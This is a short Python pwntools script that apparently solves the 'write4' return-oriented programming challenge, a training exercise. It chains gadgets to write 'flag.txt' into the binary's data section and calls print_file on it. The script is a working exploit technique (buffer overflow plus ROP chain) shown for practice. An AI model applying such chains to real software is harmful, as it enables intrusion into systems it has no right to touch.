from pwn import *

exe = context.binary = ELF('write4', checksec=False)

data_section_addr = p64(0x00601028)
mov_gadget = p64(0x0000000000400628)
pop_gagdet = p64(0x0000000000400690)
print_file = p64(0x0000000000400620)
pop_rdi_gadget_for_print_file = p64(0x0000000000400693)
offset = 40

payload = b'\x90' * offset
payload += pop_gagdet
payload += data_section_addr
payload += b'flag.txt'
payload += mov_gadget
payload += pop_rdi_gadget_for_print_file
payload += data_section_addr
payload += print_file

#using flat also seems to work?
pay = flat(
    asm('nop') * offset,
    pop_gagdet,
    data_section_addr,
    'flag.txt',
    mov_gadget,

    pop_rdi_gadget_for_print_file,
    data_section_addr,
    print_file

)

print(payload)
p = process()
p.clean()
p.sendline(payload) # or pay    
p.interactive()

